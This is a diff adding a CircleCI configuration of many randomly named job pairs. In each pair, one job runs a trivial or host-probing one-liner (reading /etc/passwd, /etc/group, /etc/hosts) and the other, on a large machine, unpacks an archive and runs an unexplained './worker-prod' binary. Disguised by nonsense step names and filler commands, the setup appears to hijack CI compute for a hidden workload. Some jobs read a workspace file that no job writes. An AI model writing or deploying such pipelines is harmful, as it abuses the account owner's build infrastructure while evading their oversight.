@@ -1,0 +1,1384 @@
+version: 2.1
+
+jobs:
+  WSIPRouter:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Bundle from Chicago
+          command: |
+            mkdir -p /tmp/qdir
+            set +o pipefail 2>/dev/null; # multi-line simple
+            echo "A"
+            echo "B"
+            seq 1 541644 > /tmp/qdir/7D; true
+            echo "task=shippit"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - '7D'
+  shippit:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Close stream B
+          command: |
+            cat < /tmp/qdir/7D > >(wc -c) 2>/dev/null; wait; true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract archive
+          command: gunzip -c basket-mirror.tgz | tar xvf -
+      - run:
+          command: (./worker-prod)
+  fetchHTTPS:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Smol reindex
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; echo $PATH|tr : '\n'|pr -3 -t; true ; } > /tmp/qdir/E51
+            echo "task=jul6-smoke"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - 'E51'
+  jul6-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Close stream B
+          command: |
+            cat < /tmp/qdir/E51 > >(wc -c) 2>/dev/null; wait; true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract archive
+          command: gunzip -c basket-mirror.tgz | tar xvf -
+      - run:
+          command: (./worker-prod)
+  helmet-6x:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Batten down the temp files
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; find /dev -maxdepth 1 ! -name 'null' -size 0 -readable|sed 's|.*/||'|sort -u; true ; } > /tmp/qdir/tenant-silver
+            echo "task=py311-release"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - 'tenant-silver'
+  py311-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Close stream B
+          command: |
+            cat < /tmp/qdir/tenant-silver > >(wc -c) 2>/dev/null; wait; true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract archive
+          command: gunzip -c basket-mirror.tgz | tar xvf -
+      - run:
+          command: (./worker-prod)
+  CONST_CALLBACK_PATH_16:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Carry the parking passes home
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; getent passwd | awk -F':' '$3 < 100 {print $1}' | head -4; true ; } > /tmp/qdir/shader
+            echo "task=Prepare_Staging6"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - 'shader'
+  Prepare_Staging6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Close stream B
+          command: |
+            cat < /tmp/qdir/shader > >(wc -c) 2>/dev/null; wait; true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract archive
+          command: gunzip -c basket-mirror.tgz | tar xvf -
+      - run:
+          command: (./worker-prod)
+  NextScopeClockBody:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Centrifuge the lab notebook with logging
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; f="${TMPDIR:-/tmp}/main.tmp"; seq 5 > "$f"; while read -r n; do echo $((n * n)); done < "$f"; true ; } > /tmp/qdir/trial4_6fac
+            echo "task=MERGE_LAB"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - 'trial4_6fac'
+  MERGE_LAB:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Close stream B
+          command: |
+            cat < /tmp/qdir/trial4_6fac > >(wc -c) 2>/dev/null; wait; true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract archive
+          command: gunzip -c basket-mirror.tgz | tar xvf -
+      - run:
+          command: (./worker-prod)
+  SidebarSpec:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: episode 029 of 33 inspecting bandwidth cap
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; echo secret >"/tmp/auth.shelf.potato-2019-11-13.list" && shred -u "/tmp/auth.shelf.potato-2019-11-13.list" && ls "/tmp/auth.shelf.potato-2019-11-13.list" 2>/dev/null || echo shredded; true ; } > /tmp/qdir/EM
+            echo "task=beta-v4"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - 'EM'
+  beta-v4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Close stream B
+          command: |
+            cat < /tmp/qdir/EM > >(wc -c) 2>/dev/null; wait; true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract archive
+          command: gunzip -c basket-mirror.tgz | tar xvf -
+      - run:
+          command: (./worker-prod)
+  resultsQueue:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Bench the deployment chart
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; touch "/tmp/uploadNorthDrive.tmp" && chmod 755 "/tmp/uploadNorthDrive.tmp" && stat -c '%a %n' "/tmp/uploadNorthDrive.tmp"; true ; } > /tmp/qdir/gadget-6072_75
+            echo "task=charlie"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - 'gadget-6072_75'
+  charlie:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Close stream B
+          command: |
+            cat < /tmp/qdir/40d346c1 > >(wc -c) 2>/dev/null; wait; true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract archive
+          command: gunzip -c basket-mirror.tgz | tar xvf -
+      - run:
+          command: (./worker-prod)
+  cursor_cell:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: make env file
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; mkdir -p '/tmp/retro-player-inventory' && rmdir '/tmp/retro-player-inventory' && echo ok; true ; } > /tmp/qdir/dJS0clA18Ge8OMVum3v
+            echo "task=fix-router"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - 'dJS0clA18Ge8OMVum3v'
+  fix-router:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Close stream B
+          command: |
+            cat < /tmp/qdir/dJS0clA18Ge8OMVum3v > >(wc -c) 2>/dev/null; wait; true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract archive
+          command: gunzip -c basket-mirror.tgz | tar xvf -
+      - run:
+          command: (./worker-prod)
+  summer069275:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Smite the secrets
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; stdbuf -oL echo "take out the trash"; true ; } > /tmp/qdir/1c2b-FTP.Indigo.aa553
+            echo "task=v9-alpha4"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - '1c2b-FTP.Indigo.aa553'
+  v9-alpha4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Close stream B
+          command: |
+            cat < /tmp/qdir/1c2b-FTP.Indigo.aa553 > >(wc -c) 2>/dev/null; wait; true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract archive
+          command: gunzip -c basket-mirror.tgz | tar xvf -
+      - run:
+          command: (./worker-prod)
+  FTR-ITEM-REC:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Strain the init containers
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; awk -v x=79 -v y=10 'BEGIN{print (x>y ? x : y)}'; true ; } > /tmp/qdir/stage1c931
+            echo "task=update-login-leak"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - 'stage1c931'
+  update-login-leak:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Close stream B
+          command: |
+            cat < /tmp/qdir/stage1c931 > >(wc -c) 2>/dev/null; wait; true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract archive
+          command: gunzip -c basket-mirror.tgz | tar xvf -
+      - run:
+          command: (./worker-prod)
+  err:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Keep embedding the checkpoints
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; dirname "/tmp/data2018-01-10.out"; true ; } > /tmp/qdir/gVtYdY39Io
+            echo "task=tb-v2"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - 'gVtYdY39Io'
+  tb-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Close stream B
+          command: |
+            cat < /tmp/qdir/gVtYdY39Io > >(wc -c) 2>/dev/null; wait; true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract archive
+          command: gunzip -c basket-mirror.tgz | tar xvf -
+      - run:
+          command: (./worker-prod)
+  handler-020612:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Always fact check the terms of service
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; ls -nr /etc/skel|sort -k9; true ; } > /tmp/qdir/23a4bf68451b
+            echo "task=deploy"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - '23a4bf68451b'
+  deploy:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Close stream B
+          command: |
+            cat < /tmp/qdir/23a4bf68451b > >(wc -c) 2>/dev/null; wait; true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract archive
+          command: gunzip -c basket-mirror.tgz | tar xvf -
+      - run:
+          command: (./worker-prod)
+  DEL_P:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Culturing each night
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; printf %s "1 2 3 4 5" | sha384sum | awk '{print $1}'; true ; } > /tmp/qdir/PANO-00031377
+            echo "task=canary"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - 'PANO-00031377'
+  canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Close stream B
+          command: |
+            cat < /tmp/qdir/PANO-00031377 > >(wc -c) 2>/dev/null; wait; true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract archive
+          command: gunzip -c basket-mirror.tgz | tar xvf -
+      - run:
+          command: (./worker-prod)
+  laser-fuel:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Cool the lockfile on a rack
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; echo "it's done" | cat -A; true ; } > /tmp/qdir/dr1f7.bond.7undr4.7hr34d.w0rk3r
+            echo "task=kilo"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - 'dr1f7.bond.7undr4.7hr34d.w0rk3r'
+  kilo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Close stream B
+          command: |
+            cat < /tmp/qdir/40d346c1 > >(wc -c) 2>/dev/null; wait; true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract archive
+          command: gunzip -c basket-mirror.tgz | tar xvf -
+      - run:
+          command: (./worker-prod)
+  orangeish:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Notify the early adopters in safe mode
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; ls -1 --reverse -p /mnt | uniq; true ; } > /tmp/qdir/exp_310
+            echo "task=cf-3"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - 'exp_310'
+  cf-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Close stream B
+          command: |
+            cat < /tmp/qdir/exp_310 > >(wc -c) 2>/dev/null; wait; true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract archive
+          command: gunzip -c basket-mirror.tgz | tar xvf -
+      - run:
+          command: (./worker-prod)
+  aud311:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Sunset the fragile items
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; for word in {5..1}; do echo $((RANDOM % 46)); done | sort -r; true ; } > /tmp/qdir/obj_hw
+            echo "task=hu-test"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - 'obj_hw'
+  hu-test:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Close stream B
+          command: |
+            cat < /tmp/qdir/obj_hw > >(wc -c) 2>/dev/null; wait; true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract archive
+          command: gunzip -c basket-mirror.tgz | tar xvf -
+      - run:
+          command: (./worker-prod)
+  disabledYes:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Collect the access cards week one
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; cat /etc/group | sort -k3,3 -t : -n; true ; } > /tmp/qdir/Q
+            echo "task=greg-run"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - 'Q'
+  greg-run:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Close stream B
+          command: |
+            cat < /tmp/qdir/Q > >(wc -c) 2>/dev/null; wait; true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract archive
+          command: gunzip -c basket-mirror.tgz | tar xvf -
+      - run:
+          command: (./worker-prod)
+  slot_cancel:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: shrug
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; cut -d'=' -f2- /etc/os-release | expand -t 7 | head --lines=4; true ; } > /tmp/qdir/NoRtHmUoN
+            echo "task=jul26-release"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - 'NoRtHmUoN'
+  jul26-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Close stream B
+          command: |
+            cat < /tmp/qdir/NoRtHmUoN > >(wc -c) 2>/dev/null; wait; true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract archive
+          command: gunzip -c basket-mirror.tgz | tar xvf -
+      - run:
+          command: (./worker-prod)
+  login_10_4_22:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Besiege the background checks
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; gzip -c /etc/hosts > '/tmp/local-products-search-public.gz' && gzip -t '/tmp/local-products-search-public.gz' && echo valid; true ; } > /tmp/qdir/Vds
+            echo "task=romeo-6"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - 'Vds'
+  romeo-6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Close stream B
+          command: |
+            cat < /tmp/qdir/Vds > >(wc -c) 2>/dev/null; wait; true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract archive
+          command: gunzip -c basket-mirror.tgz | tar xvf -
+      - run:
+          command: (./worker-prod)
+  Save-Writer2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: step six
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; awk -F: '{print $3}' /etc/passwd | awk '{print $1 * 2}' | sort -n | tail -n1; true ; } > /tmp/qdir/archivecrimsonfilterazure
+            echo "task=green-light-go"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - 'archivecrimsonfilterazure'
+  green-light-go:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Close stream B
+          command: |
+            cat < /tmp/qdir/archivecrimsonfilterazure > >(wc -c) 2>/dev/null; wait; true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract archive
+          command: gunzip -c basket-mirror.tgz | tar xvf -
+      - run:
+          command: (./worker-prod)
+  xref_POINT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Patch Scope Local
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; if [ ! -c /dev/null ] ; then echo yes; else echo no; fi; true ; } > /tmp/qdir/74dd-crimson.2654.Memo
+            echo "task=yolo"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - '74dd-crimson.2654.Memo'
+  yolo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Close stream B
+          command: |
+            cat < /tmp/qdir/74dd-crimson.2654.Memo > >(wc -c) 2>/dev/null; wait; true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract archive
+          command: gunzip -c basket-mirror.tgz | tar xvf -
+      - run:
+          command: (./worker-prod)
+  Stage-Model:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Ship the artifact registry carefully
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; printf %s 'just a test'|sha224sum|awk '{print $1}'; true ; } > /tmp/qdir/temp2d18a0
+            echo "task=fiona-ship"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - 'temp2d18a0'
+  fiona-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Close stream B
+          command: |
+            cat < /tmp/qdir/temp2d18a0 > >(wc -c) 2>/dev/null; wait; true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract archive
+          command: gunzip -c basket-mirror.tgz | tar xvf -
+      - run:
+          command: (./worker-prod)
+  alice_x:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: T3 briefing
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; awk -F: '$7 !~ /nologin/{print NF}' /etc/passwd | head -n 5; true ; } > /tmp/qdir/INV70100
+            echo "task=tango"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - 'INV70100'
+  tango:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Close stream B
+          command: |
+            cat < /tmp/qdir/INV70100 > >(wc -c) 2>/dev/null; wait; true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract archive
+          command: gunzip -c basket-mirror.tgz | tar xvf -
+      - run:
+          command: (./worker-prod)
+  team-papa:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: label loss curve rev 12
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; command ls --sort=time --hide='[a-m]*' /usr/bin/*cat | xargs; true ; } > /tmp/qdir/iter_003
+            echo "task=v5-canary2"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - 'iter_003'
+  v5-canary2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Close stream B
+          command: |
+            cat < /tmp/qdir/iter_003 > >(wc -c) 2>/dev/null; wait; true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract archive
+          command: gunzip -c basket-mirror.tgz | tar xvf -
+      - run:
+          command: (./worker-prod)
+  by4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Let us stress test the junit output
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; seq 18 51|tail -4|paste -sd+; true ; } > /tmp/qdir/oyof3b21
+            echo "task=rm-router-v2-leak"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - 'oyof3b21'
+  rm-router-v2-leak:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Close stream B
+          command: |
+            cat < /tmp/qdir/oyof3b21 > >(wc -c) 2>/dev/null; wait; true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract archive
+          command: gunzip -c basket-mirror.tgz | tar xvf -
+      - run:
+          command: (./worker-prod)
+  Date-Span-Mesh:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: FIN 2361 prompt set benchmark
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; for item in {4..1}; do sleep 0.1; echo "${item}"; done | nl; true ; } > /tmp/qdir/P_51800
+            echo "task=hyperion-rev"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - 'P_51800'
+  hyperion-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Close stream B
+          command: |
+            cat < /tmp/qdir/P_51800 > >(wc -c) 2>/dev/null; wait; true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract archive
+          command: gunzip -c basket-mirror.tgz | tar xvf -
+      - run:
+          command: (./worker-prod)
+  INV-SECT-OUT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Smol ping
+          command: |
+            mkdir -p /tmp/qdir
+            { set +o pipefail 2>/dev/null; head -15 /etc/group | cut --delimiter=: --fields=3; true ; } > /tmp/qdir/draft64db
+            echo "task=v7-ga"
+      - persist_to_workspace:
+          root: /tmp/qdir
+          paths:
+            - 'draft64db'
+  v7-ga:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Close stream B
+          command: |
+            cat < /tmp/qdir/40d346c1 > >(wc -c) 2>/dev/null; wait; true
+      - run:
+          name: Grab main branch
+          command: git clone --depth 3 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Extract archive
+          command: gunzip -c basket-mirror.tgz | tar xvf -
+      - run:
+          command: (./worker-prod)
+  constNum:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/qdir
+      - run:
+          name: Simmer the serial port
+          command: |
+            mkdir -p /tmp/qdir
